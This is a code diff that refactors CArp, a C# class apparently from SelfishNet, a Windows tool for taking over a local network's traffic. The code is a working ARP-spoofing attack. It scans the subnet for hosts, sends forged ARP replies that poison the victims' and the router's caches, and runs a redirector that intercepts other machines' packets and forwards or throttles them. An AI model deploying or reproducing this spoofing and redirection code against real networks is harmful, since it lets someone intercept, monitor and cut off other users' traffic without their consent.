@@ -7,7 +7,7 @@ using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
-namespace SelfishNet10
+namespace SelfishNet
 {
     public class CArp : IDisposable
     {
@@ -19,23 +19,23 @@ namespace SelfishNet10
 
         private PcList pcList;
 
-        private NetworkInterface nicNet;
+        private NetworkInterface networkInterface;
 
         private CPcapNet pcaparp;
 
         private CPcapNet pcapredirect;
 
-        private Thread arpListenerThread;
+        //private Thread arpListenerThread;
 
-        private Thread redirectorThread;
+        //private Thread redirectorThread;
 
-        private Thread discoveringThread;
+        //private Thread discoveringThread;
 
-        private EventWaitHandle arpListenerThreadTerminated;
+        //private EventWaitHandle arpListenerThreadTerminated;
 
-        private EventWaitHandle redirectorThreadTerminated;
+        //private EventWaitHandle redirectorThreadTerminated;
 
-        private EventWaitHandle discovererThreadTerminated;
+        //private EventWaitHandle discovererThreadTerminated;
 
         public byte[] localIP;
 
@@ -48,37 +48,36 @@ namespace SelfishNet10
         public byte[] routerMAC;
 
         public byte[] broadcastMac;
-        private bool disposedValue;
 
-        public CArp(NetworkInterface nic, PcList pclist)
+        public CArp(NetworkInterface networkInterface, PcList pclist)
         {
-            this.pcList = pclist;
-            this.nicNet = nic;
+            pcList = pclist;
+            this.networkInterface = networkInterface;
             int num = 0;
-            if (0 < nic.GetIPProperties().UnicastAddresses.Count)
+            if (0 < networkInterface.GetIPProperties().UnicastAddresses.Count)
             {
                 do
                 {
-                    if (!Convert.ToString(this.nicNet.GetIPProperties().UnicastAddresses[num].Address.AddressFamily).EndsWith("V6"))
+                    if (!Convert.ToString(this.networkInterface.GetIPProperties().UnicastAddresses[num].Address.AddressFamily).EndsWith("V6"))
                     {
                         CArp addressBytes = this;
-                        addressBytes.localIP = addressBytes.nicNet.GetIPProperties().UnicastAddresses[num].Address.GetAddressBytes();
+                        addressBytes.localIP = addressBytes.networkInterface.GetIPProperties().UnicastAddresses[num].Address.GetAddressBytes();
                         CArp cArp = this;
-                        cArp.netmask = cArp.nicNet.GetIPProperties().UnicastAddresses[num].IPv4Mask.GetAddressBytes();
+                        cArp.netmask = cArp.networkInterface.GetIPProperties().UnicastAddresses[num].IPv4Mask.GetAddressBytes();
                     }
                     num++;
                 }
-                while (num < this.nicNet.GetIPProperties().UnicastAddresses.Count);
+                while (num < this.networkInterface.GetIPProperties().UnicastAddresses.Count);
             }
             CArp addressBytes1 = this;
-            addressBytes1.localMAC = addressBytes1.nicNet.GetPhysicalAddress().GetAddressBytes();
-            if (this.nicNet.GetIPProperties().GatewayAddresses.Count > 0)
+            addressBytes1.localMAC = addressBytes1.networkInterface.GetPhysicalAddress().GetAddressBytes();
+            if (this.networkInterface.GetIPProperties().GatewayAddresses.Count > 0)
             {
                 CArp cArp1 = this;
-                cArp1.routerIP = cArp1.nicNet.GetIPProperties().GatewayAddresses[0].Address.GetAddressBytes();
+                cArp1.routerIP = cArp1.networkInterface.GetIPProperties().GatewayAddresses[0].Address.GetAddressBytes();
             }
             byte[] numArray = new byte[6];
-            this.broadcastMac = numArray;
+            broadcastMac = numArray;
             int num1 = 0;
             do
             {
@@ -86,50 +85,30 @@ namespace SelfishNet10
                 num1++;
             }
             while (num1 < 6);
-            this.pcaparp = new CPcapNet();
-            this.pcapredirect = new CPcapNet();
-            this.arpListenerThreadTerminated = new EventWaitHandle(false, EventResetMode.AutoReset);
-            this.redirectorThreadTerminated = new EventWaitHandle(false, EventResetMode.AutoReset);
-            this.discovererThreadTerminated = new EventWaitHandle(false, EventResetMode.AutoReset);
-            this.isListeningArp = false;
-            this.isDiscovering = false;
-            this.isRedirecting = false;
+            pcaparp = new CPcapNet();
+            pcapredirect = new CPcapNet();
+            //arpListenerThreadTerminated = new EventWaitHandle(false, EventResetMode.AutoReset);
+            //redirectorThreadTerminated = new EventWaitHandle(false, EventResetMode.AutoReset);
+            //discovererThreadTerminated = new EventWaitHandle(false, EventResetMode.AutoReset);
+            isListeningArp = false;
+            isDiscovering = false;
+            isRedirecting = false;
         }
 
-        //private void ~CArp()
-        //{
-        //	if (this.isDiscovering)
-        //	{
-        //		this.isDiscovering = false;
-        //		this.discovererThreadTerminated.WaitOne();
-        //	}
-        //	if (this.isListeningArp)
-        //	{
-        //		this.isListeningArp = false;
-        //		this.arpListenerThreadTerminated.WaitOne();
-        //	}
-        //	if (this.isRedirecting)
-        //	{
-        //		this.isRedirecting = false;
-        //		this.redirectorThreadTerminated.WaitOne();
-        //	}
-        //	this.completeUnspoof();
-        //}
-
-        private void arpListener()
+        private async void arpListener()
         {
             byte[] numArray = null;
             packet_headers packetHeader = null;
-            this.isListeningArp = true;
+            isListeningArp = true;
             do
             {
-                if (this.pcaparp.pcapnet_next_ex(out packetHeader, out numArray) == 0)
+                if (pcaparp.pcapnet_next_ex(out packetHeader, out numArray) == 0)
                 {
                     continue;
                 }
                 byte[] numArray1 = new byte[6];
                 Array.Copy(numArray, 6, numArray1, 0, 6);
-                if (tools.areValuesEqual(numArray1, this.localMAC) || numArray[21].ToString().CompareTo("2") != 0)
+                if (tools.areValuesEqual(numArray1, localMAC) || numArray[21].ToString().CompareTo("2") != 0)
                 {
                     continue;
                 }
@@ -141,8 +120,8 @@ namespace SelfishNet10
                 {
                     ip = new IPAddress(numArray2),
                     mac = new PhysicalAddress(numArray3),
-                    capDown = 0,
-                    capUp = 0,
+                    CapDown = 0,
+                    CapUp = 0,
                     isLocalPc = false,
                     name = "",
                     nbPacketReceivedSinceLastReset = 0,
@@ -152,19 +131,20 @@ namespace SelfishNet10
                     totalPacketReceived = 0,
                     totalPacketSent = 0
                 };
-                if (!tools.areValuesEqual(numArray2, this.routerIP))
+                if (!tools.areValuesEqual(numArray2, routerIP))
                 {
                     pC.isGateway = false;
                 }
                 else
                 {
-                    this.routerMAC = numArray1;
+                    routerMAC = numArray1;
                     pC.isGateway = true;
                 }
-                this.pcList.addPcToList(pC);
+                pcList.addPcToList(pC);
+                await Task.Delay(20);
             }
-            while (this.isListeningArp);
-            this.arpListenerThreadTerminated.Set();
+            while (isListeningArp);
+            //arpListenerThreadTerminated.Set();
         }
 
         public byte[] buildArpPacket(byte[] destMac, byte[] srcMac, short arpType, byte[] arpSrcMac, byte[] arpSrcIp, byte[] arpDestMac, byte[] arpDestIP)
@@ -191,11 +171,11 @@ namespace SelfishNet10
 
         public void completeUnspoof()
         {
-            PC router = this.pcList.getRouter();
+            PC router = pcList.getRouter();
             if (router != null)
             {
                 int num = 0;
-                if (0 < this.pcList.pclist.Count)
+                if (0 < pcList.pclist.Count)
                 {
                     do
                     {
@@ -203,18 +183,18 @@ namespace SelfishNet10
                         cArp.UnSpoof(((PC)cArp.pcList.pclist[num]).ip, router.ip);
                         num++;
                     }
-                    while (num < this.pcList.pclist.Count);
+                    while (num < pcList.pclist.Count);
                 }
             }
         }
 
-        private void discoverer()
+        private async void Discoverer()
         {
             int num;
             int num1;
             int num2;
-            this.isDiscovering = true;
-            IPAddress pAddress = new IPAddress(this.netmask);
+            isDiscovering = true;
+            IPAddress pAddress = new IPAddress(netmask);
             char[] chrArray = new char[] { '.', '\u0003' };
             string[] strArrays = pAddress.ToString().Split(chrArray);
             int[] numArray = new int[4];
@@ -225,7 +205,7 @@ namespace SelfishNet10
                 num3++;
             }
             while (num3 < 4);
-            IPAddress pAddress1 = new IPAddress(this.localIP);
+            IPAddress pAddress1 = new IPAddress(localIP);
             char[] chrArray1 = new char[] { '.', '\u0003' };
             string[] strArrays1 = pAddress1.ToString().Split(chrArray1);
             int[] numArray1 = new int[4];
@@ -267,11 +247,12 @@ namespace SelfishNet10
                                     int num21 = (num19 + 255) / (num19 + 256) + num20;
                                     if (num21 < num20 - num18 + 256)
                                     {
-                                        while (this.isDiscovering)
+                                        while (isDiscovering)
                                         {
                                             string[] str = new string[] { num8.ToString(), ".", num12.ToString(), ".", num16.ToString(), ".", num21.ToString() };
-                                            this.findMac(string.Concat(str));
-                                            Thread.Sleep(5);
+                                            FindMac(string.Concat(str));
+                                            //Thread.Sleep(5);
+                                            await Task.Delay(5);
                                             num21++;
                                             num18 = numArray[3];
                                             int num22 = 256 - num18;
@@ -281,7 +262,7 @@ namespace SelfishNet10
                                                 goto Label1;
                                             }
                                         }
-                                        this.discovererThreadTerminated.Set();
+                                        //discovererThreadTerminated.Set();
                                         return;
                                     }
                                 Label1:
@@ -303,37 +284,37 @@ namespace SelfishNet10
                 }
                 while (num8 < numArray1[0] / num * num - num5 + 256);
             }
-            this.isDiscovering = false;
-            this.discovererThreadTerminated.Set();
+            isDiscovering = false;
+            //discovererThreadTerminated.Set();
         }
 
         //protected virtual void Dispose(bool flag)
         //{
         //	if (!flag)
         //	{
-        //		this.Finalize();
+        //		Finalize();
         //	}
         //	else
         //	{
-        //		this.~CArp();
+        //		~CArp();
         //	}
         //}
 
         //public sealed override void Dispose()
         //{
-        //	//this.Dispose(true);
+        //	//Dispose(true);
         //	GC.SuppressFinalize(this);
         //}
 
-        public void findMac(string ip)
+        public void FindMac(string ip)
         {
             string str = null;
-            if (!(this.pcaparp.nicHandle == IntPtr.Zero) || this.pcaparp.pcapnet_openLive(this.nicNet.Id, 65535, 0, 1, str))
+            if (!(pcaparp.nicHandle == IntPtr.Zero) || pcaparp.pcapnet_openLive(networkInterface.Id, 65535, 0, 1, str))
             {
                 byte[] addressBytes = tools.getIpAddress(ip).GetAddressBytes();
-                byte[] numArray = this.broadcastMac;
-                byte[] numArray1 = this.localMAC;
-                this.pcaparp.pcapnet_sendpacket(this.buildArpPacket(numArray, numArray1, 1, numArray1, this.localIP, numArray, addressBytes));
+                byte[] numArray = broadcastMac;
+                byte[] numArray1 = localMAC;
+                pcaparp.pcapnet_sendpacket(buildArpPacket(numArray, numArray1, 1, numArray1, localIP, numArray, addressBytes));
             }
             else
             {
@@ -344,98 +325,98 @@ namespace SelfishNet10
         public void findMacRouter()
         {
             CArp cArp = this;
-            cArp.findMac((new IPAddress(cArp.routerIP)).ToString());
+            cArp.FindMac((new IPAddress(cArp.routerIP)).ToString());
         }
 
         private void redirector()
         {
             byte[] numArray = null;
             packet_headers packetHeader = null;
-            this.isRedirecting = true;
+            isRedirecting = true;
             byte[] numArray1 = new byte[6];
             byte[] numArray2 = new byte[4];
             byte[] numArray3 = new byte[4];
-            PC router = this.pcList.getRouter();
+            PC router = pcList.getRouter();
             if (router != null)
             {
-                this.routerMAC = router.mac.GetAddressBytes();
+                routerMAC = router.mac.GetAddressBytes();
             }
-            if (this.routerMAC != null)
+            if (routerMAC != null)
             {
-                if (this.isRedirecting)
+                if (isRedirecting)
                 {
                     do
                     {
-                        if (this.pcapredirect.pcapnet_next_ex(out packetHeader, out numArray) == 0)
+                        if (pcapredirect.pcapnet_next_ex(out packetHeader, out numArray) == 0)
                         {
                             continue;
                         }
                         Array.Copy(numArray, 6, numArray1, 0, 6);
-                        if (tools.areValuesEqual(numArray1, this.localMAC))
+                        if (tools.areValuesEqual(numArray1, localMAC))
                         {
                             Array.Copy(numArray, 26, numArray2, 0, 4);
-                            if (!tools.areValuesEqual(numArray2, this.localIP))
+                            if (!tools.areValuesEqual(numArray2, localIP))
                             {
                                 continue;
                             }
-                            this.pcList.getLocalPC().nbPacketSentSinceLastReset += (int)packetHeader.caplen;
+                            pcList.getLocalPC().nbPacketSentSinceLastReset += (int)packetHeader.caplen;
                         }
-                        else if (!tools.areValuesEqual(numArray1, this.routerMAC))
+                        else if (!tools.areValuesEqual(numArray1, routerMAC))
                         {
                             Array.Copy(numArray, 30, numArray3, 0, 4);
-                            if (tools.areValuesEqual(numArray3, this.localIP))
+                            if (tools.areValuesEqual(numArray3, localIP))
                             {
                                 continue;
                             }
-                            PC pCFromMac = this.pcList.getPCFromMac(numArray1);
+                            PC pCFromMac = pcList.getPCFromMac(numArray1);
                             if (pCFromMac == null)
                             {
                                 continue;
                             }
-                            int num = pCFromMac.capUp;
+                            int num = pCFromMac.CapUp;
                             if (num != 0 && num <= pCFromMac.nbPacketSentSinceLastReset || !pCFromMac.redirect)
                             {
                                 continue;
                             }
-                            Array.Copy(this.routerMAC, 0, numArray, 0, 6);
-                            Array.Copy(this.localMAC, 0, numArray, 6, 6);
-                            this.pcapredirect.pcapnet_sendpacket(numArray);
+                            Array.Copy(routerMAC, 0, numArray, 0, 6);
+                            Array.Copy(localMAC, 0, numArray, 6, 6);
+                            pcapredirect.pcapnet_sendpacket(numArray);
                             pCFromMac.nbPacketSentSinceLastReset += (int)packetHeader.caplen;
                         }
                         else
                         {
                             Array.Copy(numArray, 30, numArray3, 0, 4);
-                            if (!tools.areValuesEqual(numArray3, this.localIP))
+                            if (!tools.areValuesEqual(numArray3, localIP))
                             {
-                                PC pCFromIP = this.pcList.getPCFromIP(numArray3);
+                                PC pCFromIP = pcList.getPCFromIP(numArray3);
                                 if (pCFromIP == null)
                                 {
                                     continue;
                                 }
-                                int num1 = pCFromIP.capDown;
+                                int num1 = pCFromIP.CapDown;
                                 if (num1 != 0 && num1 <= pCFromIP.nbPacketReceivedSinceLastReset || !pCFromIP.redirect)
                                 {
                                     continue;
                                 }
                                 Array.Copy(pCFromIP.mac.GetAddressBytes(), 0, numArray, 0, 6);
-                                Array.Copy(this.localMAC, 0, numArray, 6, 6);
-                                this.pcapredirect.pcapnet_sendpacket(numArray);
+                                Array.Copy(localMAC, 0, numArray, 6, 6);
+                                pcapredirect.pcapnet_sendpacket(numArray);
                                 pCFromIP.nbPacketReceivedSinceLastReset += (int)packetHeader.caplen;
                             }
                             else
                             {
-                                this.pcList.getLocalPC().nbPacketReceivedSinceLastReset += (int)packetHeader.caplen;
+                                pcList.getLocalPC().nbPacketReceivedSinceLastReset += (int)packetHeader.caplen;
                             }
                         }
                     }
-                    while (this.isRedirecting);
+                    while (isRedirecting);
                 }
-                this.redirectorThreadTerminated.Set();
+                //redirectorThreadTerminated.Set();
             }
             else
             {
                 MessageBox.Show("no router found to redirect packet");
-                this.isRedirecting = false;
+                isRedirecting = false;
             }
         }
 
@@ -444,42 +425,42 @@ namespace SelfishNet10
             if (isDiscovering)
             {
                 isDiscovering = false;
-                discovererThreadTerminated.WaitOne();
+                //discovererThreadTerminated.WaitOne();
             }
             if (isListeningArp)
             {
                 isListeningArp = false;
-                arpListenerThreadTerminated.WaitOne();
+                //arpListenerThreadTerminated.WaitOne();
             }
             if (isRedirecting)
             {
                 isRedirecting = false;
-                redirectorThreadTerminated.WaitOne();
+                //redirectorThreadTerminated.WaitOne();
             }
             completeUnspoof();
         }
 
         public void Spoof(IPAddress ip1, IPAddress ip2)
         {
-            PC pCFromIP = this.pcList.getPCFromIP(ip1.GetAddressBytes());
-            PC pC = this.pcList.getPCFromIP(ip2.GetAddressBytes());
+            PC pCFromIP = pcList.getPCFromIP(ip1.GetAddressBytes());
+            PC pC = pcList.getPCFromIP(ip2.GetAddressBytes());
             if (pCFromIP != null && pC != null)
             {
-                byte[] numArray = this.localMAC;
-                this.pcaparp.pcapnet_sendpacket(this.buildArpPacket(pCFromIP.mac.GetAddressBytes(), numArray, 2, numArray, pC.ip.GetAddressBytes(), pCFromIP.mac.GetAddressBytes(), pCFromIP.ip.GetAddressBytes()));
-                byte[] numArray1 = this.localMAC;
-                this.pcaparp.pcapnet_sendpacket(this.buildArpPacket(pC.mac.GetAddressBytes(), numArray1, 2, numArray1, pCFromIP.ip.GetAddressBytes(), pC.mac.GetAddressBytes(), pC.ip.GetAddressBytes()));
+                byte[] numArray = localMAC;
+                pcaparp.pcapnet_sendpacket(buildArpPacket(pCFromIP.mac.GetAddressBytes(), numArray, 2, numArray, pC.ip.GetAddressBytes(), pCFromIP.mac.GetAddressBytes(), pCFromIP.ip.GetAddressBytes()));
+                byte[] numArray1 = localMAC;
+                pcaparp.pcapnet_sendpacket(buildArpPacket(pC.mac.GetAddressBytes(), numArray1, 2, numArray1, pCFromIP.ip.GetAddressBytes(), pC.mac.GetAddressBytes(), pC.ip.GetAddressBytes()));
                 CArp cArp = this;
-                this.pcaparp.pcapnet_sendpacket(cArp.buildArpPacket(cArp.localMAC, pC.mac.GetAddressBytes(), 2, pC.mac.GetAddressBytes(), pC.ip.GetAddressBytes(), this.localMAC, this.localIP));
-                byte[] numArray2 = this.localMAC;
-                this.pcaparp.pcapnet_sendpacket(this.buildArpPacket(numArray2, numArray2, 2, pCFromIP.mac.GetAddressBytes(), pCFromIP.ip.GetAddressBytes(), this.localMAC, this.localIP));
+                pcaparp.pcapnet_sendpacket(cArp.buildArpPacket(cArp.localMAC, pC.mac.GetAddressBytes(), 2, pC.mac.GetAddressBytes(), pC.ip.GetAddressBytes(), localMAC, localIP));
+                byte[] numArray2 = localMAC;
+                pcaparp.pcapnet_sendpacket(buildArpPacket(numArray2, numArray2, 2, pCFromIP.mac.GetAddressBytes(), pCFromIP.ip.GetAddressBytes(), localMAC, localIP));
             }
         }
 
         public int startArpDiscovery()
         {
             string str = null;
-            if (pcaparp.nicHandle == IntPtr.Zero && !this.pcaparp.pcapnet_openLive(this.nicNet.Id, 65535, 0, 1, str))
+            if (pcaparp.nicHandle == IntPtr.Zero && !pcaparp.pcapnet_openLive(networkInterface.Id, 65535, 0, 1, str))
             {
                 MessageBox.Show(str);
                 return -1;
@@ -488,9 +469,9 @@ namespace SelfishNet10
             {
                 /* modopt(System.Runtime.CompilerServices.IsConst) */
                 //Thread thread = new Thread(new ThreadStart(discoverer));
-                //this.discoveringThread = thread;
+                //discoveringThread = thread;
                 //thread.Start();
-                var task = new Task(() => discoverer(),
+                var task = new Task(() => Discoverer(),
                     TaskCreationOptions.LongRunning);
                 task.Start();
             }
@@ -500,7 +481,7 @@ namespace SelfishNet10
         public int startArpListener()
         {
             string str = null;
-            if (this.pcaparp.nicHandle == IntPtr.Zero && !this.pcaparp.pcapnet_openLive(this.nicNet.Id, 65535, 0, 1, str))
+            if (pcaparp.nicHandle == IntPtr.Zero && !pcaparp.pcapnet_openLive(networkInterface.Id, 65535, 0, 1, str))
             {
                 MessageBox.Show(str);
                 return -1;
@@ -509,11 +490,11 @@ namespace SelfishNet10
             {
                 return -2;
             }
-            if (!this.isListeningArp)
+            if (!isListeningArp)
             {
                 /* modopt(System.Runtime.CompilerServices.IsConst) */
-                //Thread thread = new Thread(new ThreadStart(this.arpListener));
-                //this.arpListenerThread = thread;
+                //Thread thread = new Thread(new ThreadStart(arpListener));
+                //arpListenerThread = thread;
                 //thread.Start();
 
                 var task = new Task(() => arpListener(), TaskCreationOptions.LongRunning);
@@ -525,60 +506,63 @@ namespace SelfishNet10
         public int startRedirector()
         {
             string str = null;
-            if (this.pcapredirect.nicHandle == IntPtr.Zero && !this.pcapredirect.pcapnet_openLive(this.nicNet.Id, 65535, 0, 1, str))
+            if (pcapredirect.nicHandle == IntPtr.Zero && !pcapredirect.pcapnet_openLive(networkInterface.Id, 65535, 0, 1, str))
             {
                 MessageBox.Show(str);
                 return -1;
             }
-            if (this.pcapredirect.pcapnet_setFilter("ip", uint.MaxValue) != 0) // review
+            if (pcapredirect.pcapnet_setFilter("ip", uint.MaxValue) != 0) // review
             {
                 return -2;
             }
-            if (!this.isRedirecting)
+            if (!isRedirecting)
             {
                 /* modopt(System.Runtime.CompilerServices.IsConst) */
-                Thread thread = new Thread(new ThreadStart(this.redirector));
-                this.redirectorThread = thread;
-                thread.Start();
+                //Thread thread = new Thread(new ThreadStart(redirector));
+                //redirectorThread = thread;
+                //thread.Start();
+
+                var task = new Task(() => redirector(), TaskCreationOptions.LongRunning);
+                task.Start();
             }
             return 0;
         }
 
         public void stopArpDiscovery()
         {
-            if (this.isDiscovering)
+            if (isDiscovering)
             {
-                this.isDiscovering = false;
-                this.discovererThreadTerminated.WaitOne();
+                isDiscovering = false;
+                //discovererThreadTerminated.WaitOne();
             }
         }
 
         public void stopArpListener()
         {
-            if (this.isListeningArp)
+            if (isListeningArp)
             {
-                this.isListeningArp = false;
-                this.arpListenerThreadTerminated.WaitOne();
+                isListeningArp = false;
+                //arpListenerThreadTerminated.WaitOne();
             }
         }
 
         public void stopRedirector()
         {
-            if (this.isRedirecting)
+            if (isRedirecting)
             {
-                this.isRedirecting = false;
-                this.redirectorThreadTerminated.WaitOne();
+                isRedirecting = false;
+                //redirectorThreadTerminated.WaitOne();
             }
         }
 
         public void UnSpoof(IPAddress ip1, IPAddress ip2)
         {
-            PC pCFromIP = this.pcList.getPCFromIP(ip1.GetAddressBytes());
-            PC pC = this.pcList.getPCFromIP(ip2.GetAddressBytes());
+            PC pCFromIP = pcList.getPCFromIP(ip1.GetAddressBytes());
+            PC pC = pcList.getPCFromIP(ip2.GetAddressBytes());
             if (pCFromIP != null && pC != null)
             {
-                this.pcaparp.pcapnet_sendpacket(this.buildArpPacket(pCFromIP.mac.GetAddressBytes(), pC.mac.GetAddressBytes(), 1, pC.mac.GetAddressBytes(), pC.ip.GetAddressBytes(), this.broadcastMac, pCFromIP.ip.GetAddressBytes()));
-                this.pcaparp.pcapnet_sendpacket(this.buildArpPacket(pC.mac.GetAddressBytes(), pCFromIP.mac.GetAddressBytes(), 1, pCFromIP.mac.GetAddressBytes(), pCFromIP.ip.GetAddressBytes(), this.broadcastMac, pC.ip.GetAddressBytes()));
+                pcaparp.pcapnet_sendpacket(buildArpPacket(pCFromIP.mac.GetAddressBytes(), pC.mac.GetAddressBytes(), 1, pC.mac.GetAddressBytes(), pC.ip.GetAddressBytes(), broadcastMac, pCFromIP.ip.GetAddressBytes()));
+                pcaparp.pcapnet_sendpacket(buildArpPacket(pC.mac.GetAddressBytes(), pCFromIP.mac.GetAddressBytes(), 1, pCFromIP.mac.GetAddressBytes(), pCFromIP.ip.GetAddressBytes(), broadcastMac, pC.ip.GetAddressBytes()));
             }
         }
 
